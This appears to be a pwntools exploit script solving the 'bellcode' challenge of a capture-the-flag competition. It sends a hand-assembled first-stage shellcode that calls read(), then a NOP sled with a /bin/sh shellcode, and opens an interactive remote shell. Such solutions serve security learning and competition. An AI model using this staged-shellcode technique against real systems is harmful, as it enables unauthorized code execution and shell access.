#!/usr/bin/env python3
from pwn import * 

p = process("./bellcode")
p = remote("bellcode.chal.imaginaryctf.org", 1337)
context.update(arch="amd64")

"""
so we need to find a way to call read(0, shellcode_buf, N)
1. set rax to 0
2. set rdi to 0
3. set rsi to somewhere in the shellcode buffer 
4. syscall
"""

# rax is already 0
# null out rax by popping a 0 off the stack into it 
# note: 6 pop rdi's work locally to set rdi to 0 but remotely we need 8
# \x5f      = pop rdi * 6
# mov esi, 0xfac300
# \xbe\x00\xc3\xfa\x00
# \x0f\x05  = syscall

payload = b"\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\xbe\x00\xc3\xfa\x00\x0f\x05" 
pause()
p.sendline(payload)

# send second stage payload 
payload = shellcraft.amd64.linux.sh()
p.sendline( (b"\x90" * 200) + asm(payload))

p.interactive()